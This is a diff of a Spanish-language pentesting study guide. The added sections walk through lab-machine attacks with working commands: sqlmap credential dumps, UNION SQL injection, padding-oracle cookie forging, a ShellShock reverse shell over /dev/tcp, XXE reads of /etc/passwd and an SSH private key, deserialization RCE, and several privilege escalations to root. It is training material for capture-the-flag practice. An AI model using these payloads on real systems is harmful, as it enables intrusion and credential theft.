@@ -5,7 +5,7 @@ Aclarar que las explotaciones que se muestran, en la gran mayoria, ya no son fun
 Por lo tanto, estos metodos se deben de tomar como simple práctica y conocimiento básico.
 
 
-### Explotación y Abuso de Privilegios
+## EXPLOTACIÓN Y ABUSO DE PRIVILEGIOS
 
 **Descripción:**
 Explotar archivos y servicios con privilegios SUID y detectar archivos críticos con permisos de escritura.
@@ -53,7 +53,7 @@ Explotar archivos y servicios con privilegios SUID y detectar archivos críticos
 
 ---
 
-### Detección de Tareas Cron a Través de un Script en Bash
+## DETECCIÓN DE TAREAS CRON A TRAVÉS DE UN SCRIPT EN BASH
 
 **Descripción:**
 Detectar tareas cron y abusar de archivos cron con permisos de escritura para escalar privilegios.
@@ -100,7 +100,7 @@ Detectar tareas cron y abusar de archivos cron con permisos de escritura para es
 
 ---
 
-### Explotación de un Path Hijacking Frente a un Binario SUID
+## EXPLOTACIÓN DE UN PATH HIJACKING FRENTE A UN BINARIO SUID
 
 **Descripción:**
 Aprovechar la vulnerabilidad de path hijacking en un binario SUID para ejecutar comandos maliciosos con privilegios elevados.
@@ -143,7 +143,7 @@ Aprovechar la vulnerabilidad de path hijacking en un binario SUID para ejecutar 
 
 ---
 
-### Explotación y Abuso de las Capabilities en Linux
+## EXPLOTACIÓN Y ABUSO DE LAS CAPABILITIES EN LINUX
 
 **Descripción:**
 Aprovechar las capabilities en Linux para obtener privilegios elevados de manera sigilosa.
@@ -642,11 +642,11 @@ Escaneo básico, solamente especificamos la URL.
 
 ---
 
-# Hackeando Nuestra Primera Máquina (RFI)
+## HACKEANDO NUESTRA PRIMERA MÁQUINA (RFI)
 
 Hasta este punto ya hemos visto la metodologia para enumerar puertos, servicios que corren bajo estos puertos, versiones... Con esto, detallaremos cómo un atacante puede hackear una máquina Linux con un servidor web y varios gestores de contenido. Supondremos que la IP víctima es `10.10.10.88`.
 
-## Preparativos
+### Preparativos
 
 1. **Verificar Conectividad**:
     ```bash
@@ -668,7 +668,7 @@ Hasta este punto ya hemos visto la metodologia para enumerar puertos, servicios 
     ```
     Creamos un directorio con el nombre de la máquina víctima y subdirectorios (`Content`, `exploits`, `nmap`, `scripts`, `tmp`) usando una función personalizada.
 
-## Fase de Reconocimiento
+### Fase de Reconocimiento
 
 1. **Escaneo de Puertos**:
     ```bash
@@ -696,7 +696,7 @@ Hasta este punto ya hemos visto la metodologia para enumerar puertos, servicios 
     ```
     Utilizamos Wfuzz para hacer un ataque de fuerza bruta con diccionarios, apuntando al directorio `webservices` encontrado en `robots.txt`.
 
-## Acceso a WordPress
+### Acceso a WordPress
 
 1. **Escaneo de WordPress**:
     ```bash
@@ -710,7 +710,7 @@ Hasta este punto ya hemos visto la metodologia para enumerar puertos, servicios 
     ```
     Utilizamos un diccionario de plugins de WordPress (`wp-plugins.fuzz.txt`) para identificar plugins instalados.
 
-## Fase de Explotación de Vulnerabilidades
+### Fase de Explotación de Vulnerabilidades
 
 1. **Buscar Exploit**:
     ```bash
@@ -738,7 +738,7 @@ Hasta este punto ya hemos visto la metodologia para enumerar puertos, servicios 
         ```
         Desde un servidor web alojando `wp-load.php`, lanzamos el exploit para obtener una reverse shell.
 
-## Tratamiento de la TTY
+### Tratamiento de la TTY
 
 1. **Obtener Pseudo-Consola**:
     ```bash
@@ -776,13 +776,13 @@ Este proceso nos permite hackear la máquina víctima, ganar acceso no privilegi
 
 ---
 
-# Uso de Searchsploit y Exploit-DB para la Búsqueda de Vulnerabilidades
+## USO DE SEARCHSPLOIT Y EXPLOIT-DB PARA LA BÚSQUEDA DE VULNERABILIDADES
 
-## Introducción
+### Introducción
 
 Searchsploit es una herramienta que se comunica con la página de exploit-db, una fuente centralizada donde se alojan exploits de todo tipo. Todo lo que aparece en la página web puede ser consultado desde la consola utilizando searchsploit.
 
-## Instalación y Actualización
+### Instalación y Actualización
 
 1. **Instalar Searchsploit**:
     ```bash
@@ -794,7 +794,7 @@ Searchsploit es una herramienta que se comunica con la página de exploit-db, un
     searchsploit -u
     ```
 
-## Uso de Searchsploit
+### Uso de Searchsploit
 
 1. **Buscar Exploits**:
     ```bash
@@ -821,23 +821,23 @@ Searchsploit es una herramienta que se comunica con la página de exploit-db, un
 
 ---
 
-# Diferencia entre Vulnerabilidades Locales y Remotas
+## DIFERENCIA ENTRE VULNERABILIDADES LOCALES Y REMOTAS
 
-## Vulnerabilidad Remota
+### Vulnerabilidad Remota
 Un exploit que se ejecuta de manera remota desde la máquina del atacante hacia la máquina víctima, sin necesidad de tener acceso interactivo a la máquina víctima.
 
-## Vulnerabilidad Local
+### Vulnerabilidad Local
 Un exploit que se ejecuta localmente en la máquina víctima, como una escalada de privilegios. Esto se realiza normalmente después de comprometer la máquina con un usuario de bajos privilegios.
 
 ---
 
-# Uso de la Herramienta Metasploit
+## USO DE LA HERRAMIENTA METASPLOIT
 
-## Introducción
+### Introducción
 
 Metasploit es una herramienta poderosa para encontrar y explotar vulnerabilidades. A continuación, se detalla cómo utilizar Metasploit para explotar un servicio web Http File Server (HFS).
 
-## Configuración Inicial
+### Configuración Inicial
 
 1. **Inicializar Metasploit**:
     ```bash
@@ -869,7 +869,7 @@ Metasploit es una herramienta poderosa para encontrar y explotar vulnerabilidade
     set <option> <value>
     ```
 
-## Configuración del Listener
+### Configuración del Listener
 
 1. **Configurar Payload**:
     ```bash
@@ -887,7 +887,7 @@ Metasploit es una herramienta poderosa para encontrar y explotar vulnerabilidade
     exploit
     ```
 
-## Sesión Meterpreter
+### Sesión Meterpreter
 
 Si el exploit es exitoso, se abrirá una sesión Meterpreter. Para obtener una consola interactiva:
 ```bash
@@ -896,13 +896,13 @@ shell
 
 ---
 
-# Explotación Manual de la Vulnerabilidad (Sin Metasploit)
+## EXPLOTACIÓN MANUAL DE LA VULNERABILIDAD (SIN METASPLOIT)
 
-## Introducción
+### Introducción
 
 Este proceso detalla cómo explotar manualmente una vulnerabilidad sin utilizar Metasploit.
 
-## Uso de Searchsploit
+### Uso de Searchsploit
 
 1. **Buscar Exploit**:
     ```bash
@@ -914,7 +914,7 @@ Este proceso detalla cómo explotar manualmente una vulnerabilidad sin utilizar 
     searchsploit -m <id>
     ```
 
-## Configuración y Ejecución
+### Configuración y Ejecución
 
 1. **Modificar el Exploit**:
     Cambiar la IP y el puerto en el exploit para configurar la reverse shell.
@@ -938,19 +938,15 @@ Este proceso detalla cómo explotar manualmente una vulnerabilidad sin utilizar 
 5. **Ganar Acceso**:
     Si el exploit es exitoso, se ganará acceso a la máquina víctima a través de una reverse shell.
 
-
-
-Estos pasos proporcionan una guía completa para utilizar Searchsploit, Exploit-DB y Metasploit para la búsqueda y explotación de vulnerabilidades, así como para entender la diferencia entre vulnerabilidades locales y remotas y cómo explotarlas manualmente.
-
 ---
 
-# Uso de la Herramienta BurpSuite
+## USO DE LA HERRAMIENTA BURPSUITE
 
-## Introducción
+### Introducción
 
 BurpSuite es una herramienta poderosa para pentesting web, actuando como un intermediario (proxy) que permite interceptar y analizar peticiones. A continuación, se describe su configuración y uso.
 
-## Configuración
+### Configuración
 
 1. **Abrir BurpSuite**:
     ```bash
@@ -975,9 +971,9 @@ BurpSuite es una herramienta poderosa para pentesting web, actuando como un inte
 
 ---
 
-# BurpSuite - Definición de Scope y Comprometiendo un Servidor Web
+## BURPSUITE - DEFINICIÓN DE SCOPE Y COMPROMETIENDO UN SERVIDOR WEB
 
-## Definir un Scope
+### Definir un Scope
 
 1. **Limpiar Items Activos**:
     - Borrar los items en `HTTP history` y `Site map`.
@@ -986,7 +982,7 @@ BurpSuite es una herramienta poderosa para pentesting web, actuando como un inte
     - Ir a `Options` y marcar `Don't send items to Proxy history or live tasks, if out of scope`.
     - Ir a `Target` -> `Scope` y añadir la URL de la web víctima.
 
-## Comprometer un Servidor Web
+### Comprometer un Servidor Web
 
 1. **Fuzzear el Servidor**:
     - Utilizar `Wfuzz` para descubrir rutas potenciales en `10.10.10.6/FUZZ`.
@@ -1028,14 +1024,11 @@ BurpSuite es una herramienta poderosa para pentesting web, actuando como un inte
         shred -zun 10 -v <nombre archivo>
         ```
 
-
-Estos pasos proporcionan una guía completa para utilizar BurpSuite en el pentesting de aplicaciones web, incluyendo la configuración inicial, la definición de un scope, y la explotación de vulnerabilidades mediante la subida de archivos maliciosos y la ejecución de comandos remotos.
-
 ---
 
-# BurpSuite: Uso del Repeater y Explotando un Caso Práctico
+## BURPSUITE: USO DEL REPEATER Y EXPLOTANDO UN CASO PRÁCTICO
 
-## Uso del Repeater
+### Uso del Repeater
 
 El Repeater de BurpSuite permite reejecutar comandos sin repetir todo el proceso de explotación.
 
@@ -1054,9 +1047,9 @@ El Repeater de BurpSuite permite reejecutar comandos sin repetir todo el proceso
 
 ---
 
-# Uso del Intruder y Explotando un Caso Práctico
+## USO DEL INTRUDER Y EXPLOTANDO UN CASO PRÁCTICO
 
-## Configuración del Intruder
+### Configuración del Intruder
 
 1. **Enviar Petición al Intruder**:
     - Desde el Repeater, enviar la petición de RCE al Intruder con `Ctrl + i` o click derecho y `Send to Intruder`.
@@ -1077,9 +1070,9 @@ El Repeater de BurpSuite permite reejecutar comandos sin repetir todo el proceso
 
 ---
 
-# Explotando Vulnerabilidad Local File Inclusion (LFI)
+## EXPLOTANDO VULNERABILIDAD LOCAL FILE INCLUSION (LFI)
 
-## Procedimiento Básico
+### Procedimiento Básico
 
 1. **Escaneo Inicial**:
     - Realizar un escaneo para identificar el SO, puertos abiertos, y servicios.
@@ -1109,9 +1102,9 @@ El Repeater de BurpSuite permite reejecutar comandos sin repetir todo el proceso
 
 ---
 
-# Explotando Vulnerabilidad Log Poisoning - LFI to RCE
+## EXPLOTANDO VULNERABILIDAD LOG POISONING - LFI TO RCE
 
-## Convertir LFI a RCE
+### Convertir LFI a RCE
 
 1. **Log Poisoning**:
     - Identificar un archivo `.log` accesible y mal configurado.
@@ -1134,15 +1127,11 @@ El Repeater de BurpSuite permite reejecutar comandos sin repetir todo el proceso
     - Escuchar con Netcat en la máquina atacante.
     - Lanzar la petición de lectura de `auth.log` para obtener una shell.
 
-
-
-Estos pasos detallan cómo usar BurpSuite para reejecutar comandos con el Repeater, automatizar ataques con el Intruder, y explotar vulnerabilidades como LFI y Log Poisoning para obtener RCE, proporcionando un enfoque sistemático y eficiente en el pentesting de aplicaciones web.
-
 ---
 
-# Explotando la Vulnerabilidad HTML Injection y XSS (Cross-Site Scripting)
+## EXPLOTANDO LA VULNERABILIDAD HTML INJECTION Y XSS (CROSS-SITE SCRIPTING)
 
-## Procedimiento Básico
+### Procedimiento Básico
 
 1. **Escaneo Inicial**:
    - Realizar un escaneo de la máquina víctima (ejemplo: `Secnotes`) utilizando herramientas como `whichSystem`, `whatweb`, `nmap`.
@@ -1179,9 +1168,9 @@ Estos pasos detallan cómo usar BurpSuite para reejecutar comandos con el Repeat
 
 ---
 
-# Explotando Vulnerabilidad Cross-Site Request Forgery (CSRF)
+## EXPLOTANDO VULNERABILIDAD CROSS-SITE REQUEST FORGERY (CSRF)
 
-## Procedimiento Básico
+### Procedimiento Básico
 
 1. **Intercepción de Cambio de Contraseña**:
    - Interceptar una petición de cambio de contraseña de una cuenta de usuario con BurpSuite.
@@ -1196,9 +1185,9 @@ Estos pasos detallan cómo usar BurpSuite para reejecutar comandos con el Repeat
 
 ---
 
-# Explotando Vulnerabilidad Server-Side Request Forgery (SSRF)
+## EXPLOTANDO VULNERABILIDAD SERVER-SIDE REQUEST FORGERY (SSRF)
 
-## Procedimiento Básico
+### Procedimiento Básico
 
 1. **Escaneo Inicial**:
    - Realizar un escaneo de la máquina víctima (ejemplo: `Haircut`) utilizando herramientas como `whichSystem`, `whatweb`, `nmap`.
@@ -1227,6 +1216,590 @@ Estos pasos detallan cómo usar BurpSuite para reejecutar comandos con el Repeat
    - Efectuar el ataque y analizar el tamaño de las respuestas para identificar puertos abiertos.
    - Listar información privilegiada interna que no debería ser visible.
 
+---
 
+## EXPLOTANDO VULNERABILIDAD SQL INJECTION CON SQLMAP
 
-Estos procedimientos detallan cómo explotar las vulnerabilidades HTML Injection, XSS, CSRF y SSRF utilizando diversas herramientas y técnicas para comprometer la seguridad de aplicaciones web y obtener acceso no autorizado a información sensible.
+### Procedimiento Básico
+
+1. **Escaneo Inicial**:
+   - Realizar un escaneo de la máquina víctima (ejemplo: `Rabbit` en HTB) utilizando herramientas como `whichSystem`, `whatweb`, `nmap`.
+   - Identificar puertos abiertos, en este caso, el puerto 8080 que lista un servicio web Apache con título "Example".
+
+2. **Búsqueda de Rutas Potenciales**:
+   - Utilizar `wfuzz` para buscar rutas en el servicio web:
+     ```bash
+     wfuzz -c -t 100 --hc=404 -w /usr/share/worldlists/dirbuster/directory-list-2.3-medium.txt https://10.10.10.71:8080/FUZZ
+     ```
+
+3. **Identificación de Recursos y Registro**:
+   - Encontrar el recurso `complain` (Complain Management System) donde se puede autenticar o registrar.
+
+4. **Verificación de SQL Injection**:
+   - Verificar si es vulnerable añadiendo `'` al final de la URL:
+     ```bash
+     view.php?mod=admin&view=repod&id=plans'
+     ```
+     Si aparece un error SQL, es vulnerable.
+
+5. **Uso de SQLMap para Exploit**:
+   - Usar `sqlmap` para explotar la vulnerabilidad:
+     ```bash
+     sqlmap -u "http://10.10.10.71:8080/complain/view.php?mod=admin&view=repod&id=plans" --cookie "PHPSESSID=[cookie]" --dbs --batch --random-agent
+     ```
+     - El parámetro `--dbs` obtiene las bases de datos disponibles.
+     - `--batch` automatiza las respuestas por defecto.
+     - `--random-agent` randomiza el User Agent.
+
+6. **Especificación de MySQL**:
+   - Para mayor eficiencia, especificar el DBMS:
+     ```bash
+     sqlmap -u "http://10.10.10.71:8080/complain/view.php?mod=admin&view=repod&id=plans" --cookie "PHPSESSID=[cookie]" --dbs --batch --random-agent --dbms=mysql
+     ```
+
+7. **Listado de Tablas y Columnas**:
+   - Listar las tablas de la base de datos `complain`:
+     ```bash
+     sqlmap -u "http://10.10.10.71:8080/complain/view.php?mod=admin&view=repod&id=plans" --cookie "PHPSESSID=[cookie]" --D complain --tables --batch --random-agent --dbms=mysql
+     ```
+   - Listar las columnas de la tabla `tbl_customer`:
+     ```bash
+     sqlmap -u "http://10.10.10.71:8080/complain/view.php?mod=admin&view=repod&id=plans" --cookie "PHPSESSID=[cookie]" --D complain --T tbl_customer --columns --batch --random-agent --dbms=mysql
+     ```
+
+8. **Dumpear Información**:
+   - Dumpear los datos de las columnas `cname` y `cpass`:
+     ```bash
+     sqlmap -u "http://10.10.10.71:8080/complain/view.php?mod=admin&view=repod&id=plans" --cookie "PHPSESSID=[cookie]" --D complain --T tbl_customer --C cname,cpass --dump --batch --random-agent --dbms=mysql
+     ```
+
+---
+
+## EXPLOTANDO VULNERABILIDAD SQL INJECTION DE FORMA MANUAL
+
+### Procedimiento Básico
+
+1. **Configuración Inicial**:
+   - Iniciar el servicio MySQL:
+     ```bash
+     service mysql start
+     ```
+   - Conectar a MySQL como root:
+     ```bash
+     mysql -u root
+     ```
+   - Mostrar las bases de datos existentes:
+     ```sql
+     show databases;
+     ```
+
+2. **Creación de una Nueva Base de Datos**:
+   - Crear una base de datos llamada `Colegio`:
+     ```sql
+     create database Colegio;
+     ```
+   - Conectarse a la base de datos `Colegio`:
+     ```sql
+     use Colegio;
+     ```
+
+3. **Creación de Tablas y Columnas**:
+   - Crear una tabla `Alumnos` con columnas:
+     ```sql
+     create table Alumnos(id int(2), username varchar(32), password varchar(32), contacto varchar(32));
+     ```
+   - Describir la tabla `Alumnos`:
+     ```sql
+     describe Alumnos;
+     ```
+
+4. **Inserción de Datos**:
+   - Insertar datos en la tabla `Alumnos`:
+     ```sql
+     insert into Alumnos(id, username, password, contacto) values(1, "administrator", "admin123!...", "546584556");
+     ```
+
+5. **Realización de Peticiones SQL**:
+   - Mostrar toda la información de la tabla:
+     ```sql
+     select * from Alumnos;
+     ```
+   - Filtrar información de la tabla:
+     ```sql
+     select * from Alumnos where id = 1;
+     ```
+
+6. **Detección de Número de Columnas**:
+   - Probar la cantidad de columnas:
+     ```sql
+     select * from Alumnos where id = 1 order by 100;-- -;
+     ```
+   - Etiquetar columnas:
+     ```sql
+     select * from Alumnos where id = 1 union select 1,2,3,4;-- -;
+     ```
+
+7. **Extracción de Información de la Base de Datos**:
+   - Obtener información de la base de datos actual:
+     ```sql
+     select * from Alumnos where id = 1 union select 1,database(),user(),@@version;-- -;
+     ```
+   - Listar todas las bases de datos:
+     ```sql
+     select * from Alumnos where id = 1 union select 1,schema_name,3,4 from information_schema.schemata;-- -;
+     ```
+   - Listar tablas de la base de datos `Colegio`:
+     ```sql
+     select * from Alumnos where id = 1 union select 1,table_name,3,4 from information_schema.tables where table_schema = "Colegio";-- -;
+     ```
+   - Listar columnas de la tabla `Alumnos` en la base de datos `Colegio`:
+     ```sql
+     select * from Alumnos where id = 1 union select 1,column_name,3,4 from information_schema.columns where table_schema = "Colegio" and table_name="Alumnos";-- -;
+     ```
+
+8. **Dumpear Información**:
+   - Obtener datos de las columnas `username` y `password`:
+     ```sql
+     select * from Alumnos where id = 1 union select 1,concat(username,0x3a,password),3,4 from Colegio.Alumnos;-- -;
+     ```
+---
+
+## EXPLOTANDO VULNERABILIDAD PADDING ORACLE ATTACK - PADBUSTER
+
+### Descripción del Ataque
+Para realizar la explotación utilizaremos la herramienta Padbuster. Nos enfrentamos a la máquina víctima Lazy (HTB), que tiene un servidor web abierto. Registrarse si es posible y observar que la cookie de sesión está encriptada. Buscamos determinar cómo está encriptada para replicarla con otros usuarios y realizar cookie hijacking. 
+
+### Proceso de Explotación
+
+1. **Identificar la vulnerabilidad:**
+   - Utilizar Padbuster para comprobar si la máquina es vulnerable a padding oracle attack:
+     ```shell
+     padbuster http://10.10.10.18/login.php [cookie] [numero de bytes] -cookie "[cookieType]=[cookie]" -encoding 0
+     ```
+
+2. **Computar una nueva cookie:**
+   - Si Padbuster determina que la cookie se encripta usando CBC, y revela que el contenido en texto plano de la cookie es `user=[username]`, se puede intentar computar la cookie de sesión del usuario admin:
+     ```shell
+     padbuster http://10.10.10.18/login.php [cookie] [numero de bytes] -cookie "[cookieType]=[cookie]" -encoding 0 -plaintext "user=admin"
+     ```
+
+3. **Resultado:**
+   - Editar la cookie de sesión con la nueva computada y autenticarse como administradores, logrando el cookie hijacking.
+
+---
+
+## EXPLOTANDO VULNERABILIDAD PADDING ORACLE ATTACK - BURPSUITE BIT FLIPPER
+
+### Descripción del Ataque
+Realizaremos el ataque de padding oracle utilizando BurpSuite con un bit flipper attack. Nos registramos en la web de la máquina víctima Lazy (HTB) con un nombre de usuario similar a 'admin', por ejemplo, 'bdmin'.
+
+### Proceso de Explotación
+
+1. **Preparación:**
+   - Interceptar una petición a la URL (http://10.10.10.18/login.php) y enviarla a Intruder con Ctrl + i.
+
+2. **Configuración del Ataque:**
+   - Seleccionar la cookie y marcarla para el ataque con 'Add $'.
+   - En el apartado de payloads, seleccionar 'Bit flipper' como tipo de payload.
+   - En opciones, añadir un grep para el mensaje de log 'You are currently logged in as [username]!'.
+
+3. **Ejecutar el Ataque:**
+   - Modificar el campo de cookie de la petición previamente capturada y hacer forwarding.
+   - Verificar la autenticación como usuario admin.
+
+---
+
+## EXPLOTANDO VULNERABILIDAD SHELLSHOCK
+
+### Descripción del Ataque
+Explotaremos la máquina Beep (HTB) que tiene el puerto 1000 abierto, observando un panel de login. Intentamos loguearnos con cualquier credencial y si se añade una extensión .cgi, .pl o .sh en la URL, se realiza un ataque ShellShock.
+
+### Proceso de Explotación
+
+1. **Preparación:**
+   - Ponerse en escucha en el puerto 443:
+     ```shell
+     nc -nlvp 443
+     ```
+
+2. **Captura y Modificación:**
+   - Capturar una petición con BurpSuite y modificar el User-Agent con la siguiente sentencia:
+     ```shell
+     User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/[tu IP]/443 0>&1
+     ```
+
+3. **Ejecución del Ataque:**
+   - Hacer forwarding del paquete y verificar acceso a la máquina víctima como usuario privilegiado.
+
+---
+
+## EXPLOTANDO VULNERABILIDAD XML ENTITY INJECTION (XXE)
+
+### Descripción del Ataque
+En la máquina víctima DevOops (HTB), con el puerto 5000 abierto, identificamos un directorio 'upload' que permite subir archivos XML. Se aprovecha esta vulnerabilidad para visualizar archivos locales del sistema.
+
+### Proceso de Explotación
+
+1. **Crear y Subir Archivo Malicioso:**
+   - Crear un archivo XML con la siguiente estructura:
+     ```xml
+     <!DOCTYPE foo [
+         <!ELEMENT foo ANY >
+         <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+     <elements>
+         <Author>&xxe;</Author>
+     </elements>
+     ```
+
+2. **Obtener Clave Privada:**
+   - Suponer que el usuario 'roosa' tiene una id_rsa privada en el directorio .ssh:
+     ```xml
+     <!DOCTYPE foo [
+         <!ELEMENT foo ANY >
+         <!ENTITY xxe SYSTEM "file:///home/roosa/.ssh/id_rsa" >]>
+     <elements>
+         <Author>&xxe;</Author>
+     </elements>
+     ```
+
+3. **Configurar y Conectar:**
+   - Copiar la clave privada obtenida y guardarla en un archivo local 'id_rsa':
+     ```shell
+     chmod 600 id_rsa
+     ```
+   - Conectarse via ssh a la máquina víctima:
+     ```shell
+     ssh -i id_rsa roosa@10.10.10.91
+     ```
+
+**Resultado:**
+- Acceso autenticado como el usuario roosa sin necesidad de contraseña, aprovechando el archivo .ssh autorizado.
+
+---
+
+## EXPLOTANDO VULNERABILIDAD DOMAIN ZONE TRANSFER
+
+### Descripción del Ataque
+Un ataque de transferencia de zona se puede realizar utilizando la herramienta `dig`, que permite emitir peticiones a nivel DNS para listar servidores ns o mx (correo). Para explotar esta vulnerabilidad, utilizaremos el parámetro `axfr`.
+
+### Proceso de Explotación
+
+1. **Listar servidores ns o mx:**
+   - Utilizar `dig` para listar los servidores ns o mx del dominio:
+     ```shell
+     dig @10.10.10.123 friendzone.red ns,mx
+     ```
+
+2. **Explotar la vulnerabilidad con `axfr`:**
+   - Si el dominio es vulnerable, se puede obtener un listado de subdominios válidos utilizando el siguiente comando:
+     ```shell
+     dig @10.10.10.123 friendzone.red axfr
+     ```
+
+3. **Utilización de subdominios:**
+   - Añadir los subdominios obtenidos al fichero `/etc/hosts`:
+     ```shell
+     sudo nano /etc/hosts
+     ```
+   - Acceder a estos subdominios desde un navegador web para ver si se lista alguna otra página con información privilegiada.
+
+---
+
+## EXPLOTANDO VULNERABILIDADES DE TIPO INSECURE DESERIALIZATION
+
+### Descripción del Ataque
+En este caso, se explota la máquina Celestial (HTB), que tiene el puerto 3000 abierto con un servicio web que muestra el texto "Hey Dummy 2 + 2 is 22". Se sospecha de deserialización insegura a partir del análisis de la cookie de sesión.
+
+### Proceso de Explotación
+
+1. **Preparación:**
+   - Definir el Scope en BurpSuite para filtrar información que provenga de la URL correspondiente.
+   - Interceptar una petición y observar el parámetro cookie (`profile=ey...`), que parece ser base64.
+
+2. **Decodificación y Modificación de la Cookie:**
+   - Decodificar la cookie en consola o con el decoder de BurpSuite:
+     ```shell
+     echo 'ey...' | base64 -d
+     ```
+   - Modificar el contenido decodificado, cambiar `username":"Dummy` por `username":"Raul`, volver a codificarlo en base64 y sustituir la cookie interceptada.
+
+3. **Ejecución y Validación:**
+   - Hacer forwarding de la petición modificada y observar el cambio en el servidor web a "Hey Raul 2 + 2 is 22".
+
+4. **Instalación de Herramientas:**
+   - Instalar `nodejs` y `npm`:
+     ```shell
+     sudo apt install nodejs npm -y
+     ```
+   - Instalar `node-serialize`:
+     ```shell
+     npm install node-serialize
+     ```
+
+5. **Creación del Script de Serialización:**
+   - Crear el siguiente script para serializar datos:
+     ```javascript
+     var y = {
+       rce: function(){
+         require('child_process').exec('whoami', function(error, stdout, stderr) { console.log(stdout) });
+       }()
+     }
+     var serialize = require('node-serialize');
+     console.log("Serialized: \n" + serialize.serialize(y));
+     ```
+
+6. **Obtención de la Cadena Serializada:**
+   - Ejecutar el script para obtener una cadena serializada:
+     ```shell
+     node serialize.js
+     ```
+
+7. **Creación de la Data Maliciosa:**
+   - Utilizar herramientas como `nodejsshell.py` para obtener la data serializada para una reverse-shell.
+   - Convertir la data en base64:
+     ```shell
+     cat data | base64 -w 0; echo
+     ```
+
+8. **Ejecución del Ataque:**
+   - Ponerse en escucha en el puerto 443:
+     ```shell
+     nc -nlvp 443
+     ```
+   - Copiar la data obtenida en el campo `profile` de la cookie interceptada y hacer forwarding del paquete.
+   - Verificar que se ha obtenido una shell sobre la máquina víctima.
+  
+   ---
+
+   ## EXPLOTANDO VULNERABILIDAD TYPE JUGGLING SOBRE PANEL LOGIN
+
+### Descripción del Ataque
+Vamos a crear un script en PHP para simular un panel de login con una vulnerabilidad de type juggling debido a una mala programación. Esto nos permitirá acceder al sistema sin conocer la contraseña correcta.
+
+### Proceso de Explotación
+
+1. **Preparación:**
+   - Iniciar el servicio Apache:
+     ```shell
+     service apache2 start
+     ```
+
+2. **Creación del Script PHP:**
+   - Crear un archivo PHP con el siguiente contenido:
+     ```html
+     <html>
+         <font color="red"><h1><marquee>Secure Login Page</marquee></h1></font>
+         <hr>
+         <body style="background-color:powderblue;">
+             <center><form method="POST" name="<?php basename($_SERVER['PHP_SELF']); ?>">
+                 Usuario: <input type="text" name="usuario" id="usuario" size="30">
+                 &nbsp;
+                 Password: <input type="password" name="password" id="password" size="30">
+                 <input type="submit" value="Login">
+             </form></center>
+         <?php
+             $USER = "admin";
+             $PASSWORD = "4st4p4ssw0rd!3simp0siblederomper!$2020..";
+
+             if(isset($_POST['usuario']) && isset($_POST['password'])){
+                 if($_POST['usuario'] == $USER){
+                     if(strcmp($_POST['password'], $PASSWORD) == 0){
+                         echo "Acceso exitoso!";
+                     } else { echo "La password es incorrecta!"; }
+                 } else { echo "El usuario es incorrecto!"; }
+             }
+         ?>
+         </body>
+     </html>
+     ```
+
+3. **Enumeración de Usuarios:**
+   - Utilizar `wfuzz` para enumerar usuarios potenciales:
+     ```shell
+     wfuzz -c -t 400 --hh=429 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -d 'usuario=FUZZ&password=test' http://IP/login.php
+     ```
+
+4. **Explotación de la Vulnerabilidad Type Juggling:**
+   - Utilizar `curl` para explotar la vulnerabilidad:
+     ```shell
+     curl -s -X POST --data 'usuario=admin&password[]=contraseña' http://IP/login.php | html2text
+     ```
+
+---
+
+## ABUSO DE SUDOERS PARA ESCALAR PRIVILEGIOS
+
+### Descripción del Ataque
+Mediante ingeniería social, se puede lograr que un administrador del sistema nos dé acceso al archivo `/etc/sudoers` para realizar alguna tarea aparentemente inofensiva, como comprimir archivos con `zip`. Esta acción se puede abusar para ganar acceso privilegiado al sistema.
+
+### Proceso de Explotación
+
+1. **Ejecución del Comando:**
+   - Utilizar el siguiente comando para escalar privilegios:
+     ```shell
+     sudo zip test /etc/hosts -T -TT 'sh #'
+     ```
+
+---
+
+## ABUSO DE PERMISOS SUID PARA ESCALAR PRIVILEGIOS
+
+### Descripción del Ataque
+Se pueden escalar privilegios aprovechándose de binarios con permisos SUID. Cualquier binario con este permiso puede ser ejecutado por cualquier usuario con los privilegios del propietario del binario.
+
+### Proceso de Explotación
+
+1. **Búsqueda de Binarios con SUID:**
+   - Buscar binarios con el bit SUID activo:
+     ```shell
+     find / -perm -4000 2>/dev/null
+     ```
+
+2. **Explotación del Binario:**
+   - Si se encuentra un binario como `/usr/bin/timeout` con SUID, se puede explotar de la siguiente manera:
+     ```shell
+     timeout 7d /bin/sh -p
+     ```
+
+---
+
+## ABUSO DE CAPABILITIES PARA ESCALAR PRIVILEGIOS
+
+### Descripción del Ataque
+Se pueden abusar de las capabilities para obtener privilegios de root. En este caso, utilizamos el binario `php7.3`.
+
+### Proceso de Explotación
+
+1. **Asignación de Capabilities:**
+   - Asignar la capability `cap_setuid+ep` al binario `php7.3`:
+     ```shell
+     sudo setcap cap_setuid+ep /usr/bin/php7.3
+     ```
+
+2. **Ejecución del Comando PHP:**
+   - Utilizar PHP para obtener una shell con privilegios de root:
+     ```shell
+     php7.3 -r "posix_setuid(0); system('/bin/bash');"
+     ```
+---
+
+## LIBRARY HIJACKING
+
+### Descripción del Ataque
+El library hijacking en Python aprovecha el orden de búsqueda de módulos en el `sys.path`. El directorio actual tiene prioridad sobre otros directorios, lo que permite cargar una versión modificada de una biblioteca estándar.
+
+### Proceso de Explotación
+
+1. **Verificación del `sys.path`:**
+   - Ejecutar Python e imprimir `sys.path`:
+     ```python
+     python
+     import sys
+     print(sys.path)
+     ```
+
+2. **Creación del Archivo Python (`example.py`):**
+   - Crear un archivo `example.py` que importe la biblioteca `hashlib`:
+     ```python
+     #!/usr/bin/python
+
+     import hashlib, sys
+
+     if len(sys.argv) != 2:
+         print("Ha habido un error...\n")
+         sys.exit(1)
+
+     if __name__ == '__main__':
+         palabra = sys.argv[1]
+         md5 = hashlib.md5(palabra.encode()).hexdigest()
+         print(md5)
+     ```
+
+3. **Localización de la Biblioteca Original:**
+   - Encontrar la ubicación de la biblioteca `hashlib`:
+     ```shell
+     locate hashlib.py
+     ```
+
+4. **Creación de la Biblioteca Falsa (`hashlib.py`):**
+   - Crear un archivo `hashlib.py` en el mismo directorio que `example.py`:
+     ```python
+     import os
+
+     os.setuid(0)
+     os.system("/bin/bash")
+     ```
+
+5. **Ejecución del Archivo Python:**
+   - Ejecutar `example.py` para que importe la versión modificada de `hashlib` y obtenga una shell con privilegios elevados:
+     ```shell
+     ./example.py palabra
+     ```
+
+---
+
+## ABUSO DEL KERNEL PARA ESCALAR PRIVILEGIOS
+
+### Descripción del Ataque
+Se pueden escalar privilegios explotando vulnerabilidades en versiones antiguas del kernel.
+
+### Proceso de Explotación
+
+1. **Verificación de la Versión del Kernel:**
+   - Obtener la versión del kernel:
+     ```shell
+     uname -a
+     ```
+
